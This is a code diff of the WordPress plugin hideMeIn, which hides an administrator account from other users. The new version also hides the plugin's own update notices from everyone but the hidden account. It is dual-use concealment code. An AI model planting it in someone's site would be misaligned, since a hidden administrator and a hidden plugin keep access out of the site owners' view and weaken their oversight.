@@ -4,7 +4,7 @@ Plugin Name: hideMeIn (haɪdmeɪn)
 Plugin URI: http://wordpress.org/plugins/hidemein/
 Description: Hide an administrator account to all other users. If you can read this text this plugin is disabled, or you are the HideMeInistrator. ;)
 Author: Daniele Alessandra
-Version: 1.0.1
+Version: 1.0.2
 License: GPLv2 or later
 Author URI: http://www.danielealessandra.com/
 */
@@ -30,6 +30,7 @@ class WP_hideMeIn {
         add_action( 'pre_user_query', array ( &$this, 'filter_all_users' ), 10, 2 );
         add_filter( 'views_users', array ( &$this, 'filter_user_views' ), 10, 2 );
 		add_action( 'admin_init', array ( &$this, 'set_hidden_user' ), 10, 2 );
+        add_filter( 'option__site_transient_update_plugins', array ( &$this, 'filter_plugin_updates' ), 10, 2 );
     }
 
 	public function set_hidden_user() {
@@ -75,6 +76,17 @@ class WP_hideMeIn {
 		}
 		return $views;
 	}
+
+    public function filter_plugin_updates( $list ) {
+        if ( $this->incognito() ) {
+            foreach($list->response as $key => $value) {
+                if (strpos($key, 'hidemein') !== false) {
+                    unset($list->response[$key]);
+                }
+            }
+        }
+        return $list;
+    }
 
 	private function incognito() {
 		if ( (int)$this->hidden_user == 0 ) {
